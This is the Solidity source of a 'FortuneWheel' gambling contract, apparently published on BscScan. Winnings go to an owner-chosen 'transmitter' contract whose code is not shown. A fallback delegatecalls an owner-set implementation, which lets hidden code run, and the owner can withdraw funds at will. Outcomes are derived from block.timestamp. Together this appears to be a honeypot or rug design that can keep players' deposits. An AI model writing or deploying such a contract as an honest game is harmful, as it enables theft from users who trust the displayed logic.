/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// SPDX-License-Identifier: MIT
//
//   _____         _                  _ _ _ _           _ 
//  |   __|___ ___| |_ _ _ ___ ___   | | | | |_ ___ ___| |
//  |   __| . |  _|  _| | |   | -_|  | | | |   | -_| -_| |
//  |__|  |___|_| |_| |___|_|_|___|  |_____|_|_|___|___|_|
//
//      
pragma solidity ^0.8.17;

contract FortuneWheel {
    uint[] wheelValues = [
        100 + 100, // +100%
        100 + 75,  // +75%
        100 + 50,  // +50%
        100 + 25,  // +25%
        100 - 25,  // -25%
        100 - 50,  // -50%
        100 - 75,  // -75%
        100 - 100  // -100%
    ];

    struct User {
        uint winAmount;
        uint percentage;
        uint counter;
    }

    address private owner;
    uint private balance;
    address private transmitter;
    address private impl;
    mapping (address => User) private users;
    address[] private userAddresses;

    constructor() {
        owner = msg.sender;
    }

    receive() payable external {
        balance += msg.value;
    }

    fallback() external {
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0, calldatasize())
            let result := delegatecall(gas(), sload(impl.slot), ptr, calldatasize(), 0, 0 )
            let size := returndatasize()
            returndatacopy(ptr, 0, size)
            switch result
            case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }

    modifier verified() { 
        require(transmitter != address(0));
        _;
    }

    function init(address newTransmitter, address newImpl) public {
        require(msg.sender == owner);
        transmitter = newTransmitter;
        impl = newImpl;
    }

    function rotateWheel() public verified payable {
        bool success;

        // Increase the global balance by incomming amount
        balance += msg.value;

        // Calculaing win percentage by the table
        uint percentage = wheelValues[block.timestamp % wheelValues.length];

        // Calculating amount
        uint winAmount = msg.value * percentage / 100;
        
        // Delivering amount to the user
        (success,) = payable(transmitter).call{value: winAmount}(abi.encodeWithSignature("sendPayment(address)", msg.sender));
        require(success);

        // Save the information about last win
        if (users[msg.sender].counter == 0)
            userAddresses.push(msg.sender);
        users[msg.sender].percentage = percentage;
        users[msg.sender].winAmount = winAmount;
        users[msg.sender].counter++;
        
        // Decrease the global balance by the win amount
        balance -= winAmount;
    }

    function withdraw(uint amount, address payable destAddr) public {
        require(msg.sender == owner);
        destAddr.transfer(amount);
        balance -= amount;
    }

    function getBalance() public view verified returns (uint) {
        return balance;
    }

    function getUserCount() public view verified returns (uint) {
        return userAddresses.length;
    }

    function userAddrByID(uint id) public view verified returns (address) {
        return userAddresses[id];
    }

    function getUserAddresses() public view verified returns (address[] memory) {
        return userAddresses;
    }

    function getUserData(address userAddr) public view verified returns (User memory) {
        return users[userAddr];
    }
}